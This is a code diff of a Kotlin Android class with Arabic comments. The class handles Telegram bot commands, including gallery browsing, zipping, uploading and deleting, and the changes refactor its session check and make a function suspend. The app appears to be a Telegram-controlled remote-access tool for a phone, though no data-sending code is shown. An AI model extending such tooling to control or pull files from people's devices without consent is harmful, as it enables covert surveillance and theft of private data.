@@ -28,7 +28,8 @@ import kotlin.random.Random
  * - ربط الأزرار بالوظائف التنفيذية بشكل صحيح.
  * - إزالة تسريب كلمة المرور من رسائل الخطأ.
  * - إضافة معالجة أوامر المعرض (g_nav|g_opt|g_zip|g_upload|g_del_sel).
- * - إضافة دالة مساعدة للتحقق من الجلسة.
+ * - إضافة دالة مساعدة للتحقق من الجلسة مع تمرير monitor كمعامل.
+ * - جعل دالة ex suspend للتوافق مع دالة execute suspend.
  */
 class Commands private constructor(context: Context) {
 
@@ -99,9 +100,9 @@ class Commands private constructor(context: Context) {
         }
 
         /**
-         * نقطة دخول خارجية لتنفيذ الأوامر
+         * ✅ نقطة دخول خارجية لتنفيذ الأوامر (تم تعديلها لتصبح suspend)
          */
-        fun ex(
+        suspend fun ex(
             context: Context,
             cmd: String,
             tg: Any?,
@@ -485,8 +486,8 @@ class Commands private constructor(context: Context) {
                 ))
             }
 
-            // ✅ التحقق من الجلسة
-            if (!isAuthorized(cid)) {
+            // ✅ التحقق من الجلسة (تمرير m كـ monitor)
+            if (!isAuthorized(cid, m)) {
                 sendTelegramMessage(tg, cid, "⚠️ انتهت الجلسة، استخدم /login")
                 return
             }
@@ -1013,10 +1014,10 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  ✅ دالة مساعدة للتحقق من الجلسة
+    //  ✅ دالة مساعدة للتحقق من الجلسة (تم إصلاح خطأ monitor)
     // ============================================================
 
-    private suspend fun isAuthorized(cid: Long): Boolean {
+    private suspend fun isAuthorized(cid: Long, monitor: Any?): Boolean {
         val ui = getModuleComponent(monitor, "ui") ?: return false
         val sessions = getModuleField(ui, "sessions") as? ConcurrentHashMap<*, *> ?: return false
         val session = sessions[cid.toString()] as? Long ?: 0L
